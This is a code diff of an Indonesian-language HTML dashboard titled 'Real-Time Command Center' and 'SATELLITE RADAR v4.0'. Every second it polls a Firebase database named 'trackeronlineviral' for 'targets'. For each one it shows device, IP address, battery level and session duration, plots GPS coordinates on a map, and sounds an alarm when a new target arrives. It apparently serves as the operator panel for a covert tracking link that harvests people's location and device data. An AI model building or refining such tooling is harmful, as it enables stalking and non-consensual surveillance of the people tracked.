@@ -2,80 +2,107 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Multi-Target Monitoring Dashboard</title>
+    <title>Real-Time Command Center</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
-        .container { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
-        .card { background: #141414; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; font-size: 12px; }
-        th, td { border: 1px solid #222; padding: 8px; text-align: left; }
-        th { background: #1a1a1a; color: #00ff41; }
-        tr:hover { background: #1a1a1a; cursor: pointer; }
-        .map-box { height: 400px; border: 1px solid #00ff41; margin-top: 20px; }
-        iframe { width: 100%; height: 100%; border: none; filter: invert(90%); }
+        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 20px; margin: 0; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
+        .card { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 8px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
+        th { color: #888; text-transform: uppercase; font-size: 11px; }
+        .map-box { height: 400px; background: #000; border: 1px solid #00ff41; margin-top: 15px; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
+        .session-time { color: #fbbf24; font-weight: bold; }
+        .new-target-alert { animation: flash 0.5s infinite; }
+        @keyframes flash { 0% { color: #00ff41; } 50% { color: #fff; } 100% { color: #00ff41; } }
     </style>
 </head>
 <body>
 
-<h1>[MULTI-TARGET RADAR]</h1>
+<div class="header">
+    <h1>SATELLITE RADAR v4.0</h1>
+    <div id="connection-status">SISTEM AKTIF</div>
+</div>
 
-<div class="container">
+<div class="grid">
     <div class="card">
-        <h2>DAFTAR TARGET AKTIF</h2>
-        <table id="targetTable">
+        <h3>DAFTAR TARGET AKTIF</h3>
+        <table>
             <thead>
                 <tr>
-                    <th>ID</th>
                     <th>DEVICE</th>
+                    <th>IP ADDRESS</th>
                     <th>BATTERY</th>
-                    <th>LAST SEEN</th>
+                    <th>DURASI SESI</th>
+                    <th>AKSI</th>
                 </tr>
             </thead>
-            <tbody>
-                </tbody>
+            <tbody id="targetList"></tbody>
         </table>
     </div>
 
     <div class="card">
-        <h2>DETAIL & MAP</h2>
-        <div id="detailInfo">Pilih target dari tabel untuk melihat lokasi.</div>
+        <h3>VISUALISASI LOKASI</h3>
+        <div id="detailInfo">Pilih target untuk melacak...</div>
         <div class="map-box" id="mapBox"></div>
     </div>
 </div>
 
-<script>
-    const DB_ROOT = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";
+<audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>
 
-    function loadTargets() {
-        fetch(DB_ROOT)
+<script>
+    const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";
+    let knownTargets = new Set();
+
+    function formatDuration(startTime) {
+        const diff = Math.floor((Date.now() - startTime) / 1000);
+        const h = Math.floor(diff / 3600);
+        const m = Math.floor((diff % 3600) / 60);
+        const s = diff % 60;
+        return `${h}j ${m}m ${s}d`;
+    }
+
+    function updateDashboard() {
+        fetch(DB_URL)
         .then(res => res.json())
-        .then(targets => {
-            const tbody = document.querySelector("#targetTable tbody");
-            tbody.innerHTML = "";
-            
-            for (let id in targets) {
-                const t = targets[id];
-                const row = `
-                    <tr onclick="showMap(${t.lat}, ${t.lon}, '${t.device}', '${t.ip}')">
-                        <td>${t.id}</td>
+        .then(data => {
+            const tbody = document.getElementById('targetList');
+            if (!data) { tbody.innerHTML = "<tr><td colspan='5'>Menunggu target...</td></tr>"; return; }
+
+            let currentHTML = "";
+            for (let id in data) {
+                const t = data[id];
+                
+                // Alarm jika ada target baru
+                if (!knownTargets.has(id)) {
+                    document.getElementById('alarmSound').play().catch(()=>{});
+                    knownTargets.add(id);
+                }
+
+                currentHTML += `
+                    <tr>
                         <td>${t.device}</td>
+                        <td>${t.ip}</td>
                         <td>${t.battery}</td>
-                        <td>${t.updated_at.split(',')[1]}</td>
+                        <td class="session-time">${formatDuration(t.start_time)}</td>
+                        <td><button onclick="showMap(${t.lat}, ${t.lon})" style="background:#00ff41; border:none; padding:5px 10px; cursor:pointer;">TRACK</button></td>
                     </tr>
                 `;
-                tbody.innerHTML += row;
             }
+            tbody.innerHTML = currentHTML;
         });
     }
 
-    function showMap(lat, lon, device, ip) {
-        document.getElementById('detailInfo').innerHTML = `<b>Device:</b> ${device} <br> <b>IP:</b> ${ip}`;
-        const mapURL = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+    function showMap(lat, lon) {
+        const mapURL = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
         document.getElementById('mapBox').innerHTML = `<iframe src="${mapURL}"></iframe>`;
+        document.getElementById('detailInfo').innerText = `Koordinat: ${lat}, ${lon}`;
     }
 
-    setInterval(loadTargets, 5000);
-    window.onload = loadTargets;
+    // Update setiap 1 detik agar hitungan sesi terlihat real-time
+    setInterval(updateDashboard, 1000);
+    window.onload = updateDashboard;
 </script>
 </body>
 </html>
